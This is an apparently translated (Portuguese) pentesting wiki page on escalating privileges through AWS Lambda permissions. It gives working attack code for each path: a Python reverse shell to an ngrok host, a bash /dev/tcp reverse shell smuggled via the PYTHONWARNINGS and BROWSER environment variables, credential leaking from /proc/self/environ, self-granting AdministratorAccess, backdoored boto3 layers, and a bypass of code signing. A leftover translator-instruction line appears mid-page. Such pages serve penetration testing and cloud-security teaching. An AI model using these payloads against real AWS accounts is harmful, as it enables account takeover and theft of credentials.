# AWS - Lambda Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## lambda

Mais informações sobre lambda em:

{{#ref}}
../../aws-services/aws-lambda-enum.md
{{#endref}}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Usuários com as permissões **`iam:PassRole`, `lambda:CreateFunction` e `lambda:InvokeFunction`** podem escalar seus privilégios.\
Eles podem **criar uma nova função Lambda e atribuir a ela uma IAM role existente**, concedendo à função as permissões associadas a essa IAM role. O usuário pode então **escrever e fazer upload de código para essa função Lambda (por exemplo, com um rev shell)**.\
Uma vez que a função esteja configurada, o usuário pode **disparar sua execução** e as ações pretendidas invocando a função Lambda através da AWS API. Essa abordagem permite efetivamente que o usuário execute tarefas indiretamente através da função Lambda, operando com o nível de acesso concedido à IAM role associada a ela.\\

Um atacante pode abusar disso para obter um **rev shell e roubar o token**:
```python:rev.py
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```

```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Você também poderia **abuse the lambda role permissions** a partir da própria lambda function.  
Se a lambda role tivesse permissões suficientes, você poderia usá-la para conceder direitos de administrador a si mesmo:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Também é possível leak as credentials da role da lambda sem precisar de uma conexão externa. Isso seria útil para Network isolated Lambdas usadas em tarefas internas. Se houver security groups desconhecidos filtrando seus reverse shells, este trecho de código permitirá que você leak diretamente as credentials como a saída da lambda.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Impacto Potencial:** Privesc direto para o role de serviço lambda arbitrário especificado.

> [!CAUTION]
> Observe que, mesmo que possa parecer interessante, **`lambda:InvokeAsync`** **não** permite por si só **executar `aws lambda invoke-async`**, você também precisa de `lambda:InvokeFunction`

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Como no cenário anterior, você pode **conceder a si mesmo a permissão `lambda:InvokeFunction`** se tiver a permissão **`lambda:AddPermission`**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Impacto Potencial:** Privesc direto para a função de serviço do Lambda arbitrária especificada.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Usuários com permissões **`iam:PassRole`, `lambda:CreateFunction` e `lambda:CreateEventSourceMapping`** (e potencialmente `dynamodb:PutItem` e `dynamodb:CreateTable`) podem indiretamente **escalar privilégios** mesmo sem `lambda:InvokeFunction`.\
Eles podem criar uma **função Lambda com código malicioso e atribuir a ela uma role IAM existente**.

Ao invés de invocar o Lambda diretamente, o usuário configura ou utiliza uma tabela DynamoDB existente, vinculando-a ao Lambda por meio de um event source mapping. Essa configuração garante que a função Lambda seja **acionada automaticamente quando um novo item** for inserido na tabela, seja pela ação do usuário ou por outro processo, invocando indiretamente a função Lambda e executando o código com as permissões da role IAM passada.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Se o DynamoDB já estiver ativo no ambiente AWS, o usuário precisa apenas **estabelecer o event source mapping** para a função Lambda. No entanto, se o DynamoDB não estiver em uso, o usuário deve **criar uma nova tabela** com streaming habilitado:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Agora é possível **conectar a função Lambda à tabela DynamoDB** ao **criar um event source mapping**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Com a função Lambda vinculada ao DynamoDB stream, o atacante pode **acionar indiretamente a Lambda ao ativar o DynamoDB stream**. Isso pode ser realizado **inserindo um item** na tabela do DynamoDB:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Impacto Potencial:** Privesc direto para o service role do lambda especificado.

### `lambda:AddPermission`

Um atacante com essa permissão pode **conceder a si mesmo (ou a outros) qualquer permissão** (isso gera políticas baseadas em recursos para conceder acesso ao recurso):
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
**Impacto Potencial:** Privesc direto para a função de serviço do lambda usada ao conceder permissão para modificar o código e executá-lo.

### `lambda:AddLayerVersionPermission`

Um atacante com essa permissão pode **conceder a si mesmo (ou a outros) a permissão `lambda:GetLayerVersion`**. Ele poderia acessar a camada e procurar por vulnerabilidades ou informações sensíveis
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
**Impacto Potencial:** Acesso potencial a informações sensíveis.

### `lambda:UpdateFunctionCode`

Usuários com a permissão **`lambda:UpdateFunctionCode`** têm o potencial de **modificar o código de uma função Lambda existente que está vinculada a um role do IAM.**\
O atacante pode **modificar o código da Lambda para exfiltrate as credenciais do IAM**.

Embora o atacante possa não ter a capacidade direta de invocar a função, se a função Lambda já existir e estiver operacional, é provável que ela seja acionada por fluxos de trabalho ou eventos existentes, facilitando assim indiretamente a execução do código modificado.
```bash
# The zip should contain the lambda code (trick: Download the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
**Impacto Potencial:** privesc direto para o service role usado pela função Lambda.

### `lambda:UpdateFunctionConfiguration`

#### RCE via variáveis de ambiente

Com essa permissão é possível adicionar variáveis de ambiente que farão com que a função Lambda execute código arbitrário. Por exemplo, em python é possível abusar das variáveis de ambiente `PYTHONWARNING` e `BROWSER` para fazer um processo python executar comandos arbitrários:
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
Para outras linguagens de script, existem outras variáveis de ambiente que você pode usar. Para mais informações, consulte as subseções de linguagens de script em:

{{#ref}}
https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/index.html
{{#endref}}

#### RCE via Lambda Layers

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) permite incluir **code** na sua lamdba function, mas **storing it separately**, de modo que o código da função pode permanecer pequeno e **several functions can share code**.

Dentro do lambda você pode verificar os caminhos de onde o python code é carregado com uma função como a seguinte:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Estes são os locais:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Por exemplo, a biblioteca boto3 é carregada de `/var/runtime/boto3` (4th position).

#### Exploração

É possível abusar da permissão `lambda:UpdateFunctionConfiguration` para **add a new layer** a uma função lambda. Para executar código arbitrário essa layer precisa conter alguma **library que o lambda vai importar.** Se você puder ler o código do lambda, pode encontrar isso facilmente; também note que pode ser possível que o lambda já esteja **already using a layer** e você possa **download** a layer e **add your code** nela.

Por exemplo, suponha que o lambda esteja usando a biblioteca boto3; isso criará uma layer local com a versão mais recente da biblioteca:
```bash
pip3 install -t ./lambda_layer boto3
```
Você pode abrir `./lambda_layer/boto3/__init__.py` e **adicionar a backdoor no código global** (a function to exfiltrate credentials or get a reverse shell for example).

Depois, compacte o diretório `./lambda_layer` e **faça upload do novo lambda layer** na sua própria conta (ou na da vítima, mas você pode não ter permissões para isso).\
Observe que você precisa criar um python folder e colocar as bibliotecas nele para sobrescrever /opt/python/boto3. Além disso, o layer precisa ser **compatível com a python version** usada pela lambda e, se você fizer upload para sua conta, precisa estar na **mesma region:**
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
Agora, torne a lambda layer enviada **acessível por qualquer conta**:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
E anexe a lambda layer à função lambda da vítima:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
O próximo passo seria ou **invocar a função** nós mesmos, se pudermos, ou esperar até que **ela seja invocada** por meios normais — que é o método mais seguro.

Uma **maneira mais stealth de explorar esta vulnerabilidade** pode ser encontrada em:

{{#ref}}
../../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md
{{#endref}}

**Potential Impact:** Privesc direto para a role de serviço do lambda usada.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Talvez com essas permissões você consiga criar uma função e executá-la chamando a URL... mas eu não consegui encontrar uma maneira de testá-la, então me avise se você conseguir!

### Lambda MitM

Some lambdas are going to be **receiving sensitive info from the users in parameters.** If get RCE in one of them, you can exfiltrate the info other users are sending to it, check it in:

{{#ref}}
../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md
{{#endref}}

## Referências

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{{#include ../../../../banners/hacktricks-training.md}}




### `lambda:DeleteFunctionCodeSigningConfig` or `lambda:PutFunctionCodeSigningConfig` + `lambda:UpdateFunctionCode` — Bypass Lambda Code Signing

Se uma função Lambda exigir code signing, um atacante que puder remover a Code Signing Config (CSC) ou rebaixá-la para Warn pode implantar código não assinado na função. Isso contorna as proteções de integridade sem modificar a role IAM da função ou os triggers.

Permissions (one of):
- Path A: `lambda:DeleteFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`
- Path B: `lambda:CreateCodeSigningConfig`, `lambda:PutFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`

Notes:
- For Path B, you don't need an AWS Signer profile if the CSC policy is set to `WARN` (unsigned artifacts allowed).

Steps (REGION=us-east-1, TARGET_FN=<target-lambda-name>):

Prepare a small payload:
```bash
cat > handler.py <<'PY'
import os, json
def lambda_handler(event, context):
return {"pwn": True, "env": list(os.environ)[:6]}
PY
zip backdoor.zip handler.py
```
Caminho A) Remover CSC e atualizar o código:
```bash
aws lambda get-function-code-signing-config --function-name $TARGET_FN --region $REGION && HAS_CSC=1 || HAS_CSC=0
if [ "$HAS_CSC" -eq 1 ]; then
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION
fi
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Caminho B) Rebaixar para Warn e atualizar o código (se delete não for permitido):
```bash
CSC_ARN=$(aws lambda create-code-signing-config \
--description ht-warn-csc \
--code-signing-policies UntrustedArtifactOnDeployment=WARN \
--query CodeSigningConfig.CodeSigningConfigArn --output text --region $REGION)
aws lambda put-function-code-signing-config --function-name $TARGET_FN --code-signing-config-arn $CSC_ARN --region $REGION
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Confirmo: vou traduzir o texto relevante para português mantendo exatamente a mesma sintaxe Markdown/HTML. Não traduzirei código, nomes de técnicas, termos comuns de hacking, nomes de plataformas (Workspace, aws, gcp...), a palavra "leak", "pentesting", links, paths, refs ou qualquer tag (por exemplo {#tabs}, {#tab name="Method1"}, {#ref}, {#include ...}). Não alterarei tags/links/paths e não adicionarei conteúdo extra.
```bash
aws lambda invoke --function-name $TARGET_FN /tmp/out.json --region $REGION >/dev/null
cat /tmp/out.json
```
Impacto potencial: Capacidade de enviar e executar código arbitrário não assinado em uma função que deveria impor implantações assinadas, potencialmente levando à execução de código com as permissões da role da função.

Limpeza:
```bash
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION || true
```

